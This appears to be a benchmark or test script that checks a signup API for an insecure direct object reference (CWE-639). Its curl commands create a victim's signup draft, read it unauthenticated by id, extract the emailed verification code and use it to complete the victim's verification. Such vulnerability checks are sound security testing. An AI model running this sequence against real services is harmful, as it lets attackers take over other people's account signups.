#!/usr/bin/env bash
# SIGNUP-IDOR-001 (CWE-639): any draft is readable by id, unauthenticated, and
# the row carries the email AND the verification code emailed to somebody else.
set -eu; . "$(dirname "$0")/_lib.sh"
VICTIM="victim-$$@bench.local"
VID=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' \
  -d "{\"email\":\"$VICTIM\"}" | jget draftId)
[ -n "$VID" ]
STOLE=$(curl -s "$TARGET/api/signup/draft/$VID")
echo "$STOLE" | grep -q "$VICTIM"
echo "$STOLE" | grep -q '"code"'
# the stolen code completes the victim's verification
CODE=$(echo "$STOLE" | jget code)
curl -s -X POST "$TARGET/api/signup/verify" -H 'content-type: application/json' \
  -d "{\"draftId\":$VID,\"code\":\"$CODE\"}" | grep -q '"ok":true'
